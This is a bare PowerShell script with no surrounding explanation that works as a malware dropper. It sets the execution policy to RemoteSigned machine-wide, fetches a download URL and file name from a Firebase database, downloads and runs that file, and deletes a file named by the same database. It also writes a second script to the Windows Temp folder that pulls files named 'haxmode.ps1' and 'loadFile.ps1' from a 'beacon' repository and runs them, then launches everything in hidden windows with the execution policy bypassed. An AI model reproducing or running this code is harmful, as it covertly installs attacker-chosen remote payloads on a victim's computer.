Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force;  
$url = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/URL.json"; $name = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/name.json"; Invoke-WebRequest -Uri $url -OutFile "$name"; Start-Process -FilePath "$name"; 
$hapus = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/exe.json"

# Get the current working directory
$currentDir = Get-Location

# Define the content of the new .ps1 script
$scriptContent = @"
Remove-Item -Path "$currentDir\$hapus" -Force

Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force;  
Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\Windows\Temp\mode.ps1;  
C:\Windows\Temp\mode.ps1;
Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > C:\Windows\Temp\start.ps1;  
C:\Windows\Temp\start.ps1;
Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"'
"@

# Write the content to the new .ps1 script file
$scriptContent | Out-File -FilePath "C:\Windows\Temp\new.ps1" -Encoding ascii

# Output the path of the new .ps1 script file
$newScriptPath = "C:\Windows\Temp\new.ps1"
Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $newScriptPath"
